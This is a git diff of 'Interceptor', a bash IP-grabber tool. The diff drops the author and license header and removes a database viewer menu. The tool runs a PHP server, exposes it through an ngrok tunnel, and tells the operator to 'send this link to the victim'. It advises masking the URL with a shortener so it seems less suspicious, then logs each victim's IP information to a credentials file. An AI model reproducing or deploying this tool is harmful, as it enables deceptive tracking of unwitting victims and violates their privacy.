@@ -1,8 +1,4 @@
 #!/bin/bash
-# AUTHOR: Lucksi
-# Copyright © 2021 Lucksi
-# License: GNU General Public License v3.0
-
 YELLOW=$(tput setaf 11)
 RED=$(tput setaf 1)
 GREEN=$(tput setaf 2)
@@ -59,56 +55,13 @@ function update {
         fi
         sleep 2
         printf "${WHITE}\n\nINTERCEPTOR UPDATED CORRECTLY\n\n"
-        read -p "$YELLOW[INTERCEPTOR]$WHITE-->" confvar
         printf "${WHITE}\nPRESS ENTER TO EXIT"
-        read -p
+        read
         exit 1
     fi
     printf "${WHITE}\n\nINTERCEPTOR NOT INSTALLED IT MAY BE AN INTERNET PROBLEM\n\n"
     mv Interceptor2 Interceptor
     exit 1
-}
-
-function Database {
-    clear
-    banner=$(<"Banner/Banner4.txt") 
-    printf "${YELLOW}$banner"
-    printf "${GREEN}\n\n[+]${WHITE}LISTING DATABASE FILES..."
-    sleep 3
-    for entry in $(ls Database);
-        do
-        printf "\n${GREEN}[+]${WHITE}$entry"
-    done
-    printf "${GREEN}\n\n[+]${WHITE}INSERT THE FILE NAME THAT YOU WANT TO OPEN(LEAVE EMPTY TO GO BACK TO THE MENU)\n\n"
-    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" File
-   
-    while [ $File != "" ];
-        do
-        printf "${GREEN}\n[+]${WHITE}CHECKING IF FILE EXIST...\n"
-        sleep 2
-        if [ -f "Database/$File" ]; 
-            then
-            printf "${GREEN}\n[+]${WHITE}OPENING FILE $File...\n\n"
-            sleep 2
-            reader=$(<"Database/$File")
-            while IFS= read -r line
-                do    
-                echo "${GREEN}[+]${WHITE}$line"
-                if [ "$line" == "" ];
-                then
-                break
-            fi
-            done < "Database/$File"
-            printf "${GREEN}\n[+]${WHITE}PRESS ENTER TO CONTINUE...\n\n"
-            read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Port
-            Database
-        fi
-        printf "${GREEN}\n[+]${WHITE}FILE NOT FOUND PRESS ENTER TO CONTINUE...\n\n"
-        read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Port
-        Database
-
-    done
-    Menu
 }
 
 function Grabber {
@@ -151,17 +104,7 @@ function Grabber {
     clear
     banner=$(<"Banner/Banner3.txt") 
     printf "${YELLOW}$banner"
-    printf "${GREEN}\n\n[+]${WHITE}OPTION SAVED:${YELLOW}SUCCESSFULLY"
-    printf "${GREEN}\n\n[+]${WHITE}CHECKING ${YELLOW}$Victim ${WHITE}OLD DATA..."
-    file2="Database/$Victim.txt"
-    sleep 2 
-    if [ -f $file2 ];
-        then
-        printf "${GREEN}\n\n[+]${WHITE}OLD DATA FOUND DELETING..."
-        rm $file2
-    else
-        printf "${GREEN}\n\n[+]${WHITE}NO DATA FOUND"
-    fi
+    printf "${GREEN}\n\n[+]${WHITE}OPTION SAVED:${YELLOW} SUCCESSFULLY"
     printf "${GREEN}\n\n[+]${WHITE}RUNNING PHP SERVER..."
     sleep 2
     php -S  127.0.0.1:$Port -t Template  >/dev/null 2>&1 &
@@ -170,10 +113,12 @@ function Grabber {
     printf "${GREEN}\n[+]${WHITE}GENERATING URL...\n"
     Tunnel/./ngrok http $Port >/dev/null 2>&1 &
     sleep 9
-    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-    printf "${GREEN}\n[+]${WHITE}SEND THIS LINK TO THE VICTIM:${YELLOW}$link\n"
-    printf "${GREEN}\n[+]${YELLOW}TIPS:${WHITE}USE A URL SHORTENER FOR MASK THESE URL SO IT MAY SEEM LESS SUSPICIOUS:)"
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)
+    printf "${GREEN}\n[+]${WHITE}SEND THIS LINK TO THE VICTIM: ${GREEN}$link\n"
+    printf "${GREEN}\n[+]${YELLOW}TIPS:${WHITE} USE A URL SHORTENER FOR MASK THIS URL SO IT MAY SEEM LESS SUSPICIOUS:)"
     printf "${GREEN}\n\n[+]${WHITE}WAITING FOR THE VICTIM TO OPEN THE LINK:\n"
+    file="Creds/Database.txt"
+    file2="Creds/$Victim.txt"
     while [ ! -s $file2 ];
         do
         found=0
@@ -191,6 +136,8 @@ function Grabber {
     done < "$file2"
     printf "${GREEN}\n[+]${WHITE}ADDING${YELLOW} $Victim${WHITE} IP ON THE DATABASE...\n"
     sleep 4
+    echo "$info">>$file
+    echo "">>$file
     printf "${GREEN}\n[+]${WHITE}DELETING OLD SERVER FILE...\n"
     sleep 3
     rm Temp/User.txt && rm Temp/Url.txt
@@ -211,7 +158,7 @@ function Menu {
     printf "${WHITE}[+]${GREEN}VERSION:$Version\n"
     printf "${YELLOW}Instagram:lucks_022\nEMAIL:lukege287@gmail.com\nGIT-HUB:Lucksi\nWebsite:https://sosuke.altervista.org"
     printf "${GREEN}\n\n[*INSERT AN OPTION*]\n"
-    printf "${WHITE}(1)IP-GRABBER\n(2)DATABASE\n(3)UPDATE\n(4)EXIT\n\n"
+    printf "${WHITE}(1)IP-GRABBER\\n(2)UPDATE\n(3)EXIT\n\n"
     read -p "$YELLOW[INTERCEPTOR]$WHITE-->" option
     if [ $option == 1 ];
         then
@@ -219,11 +166,8 @@ function Menu {
         Menu
     elif [ $option == 2 ];
         then
-        Database
-    elif [ $option == 3 ];
-        then
         Check
-    elif [ $option == 4 ];
+    elif [ $option == 3 ];
         then
         exit 1
     fi
@@ -233,7 +177,7 @@ function Menu {
 if [ $(id -u) -ne 0 ]; 
 	then
 	clear
-    Banner
+    	Banner
 	printf "${RED}\n\n[!]"${WHITE}"THIS SCRIPT MUST BE RUN AS ROOT TRY WITH SUDO :)\n\n"
 	exit 1
 fi
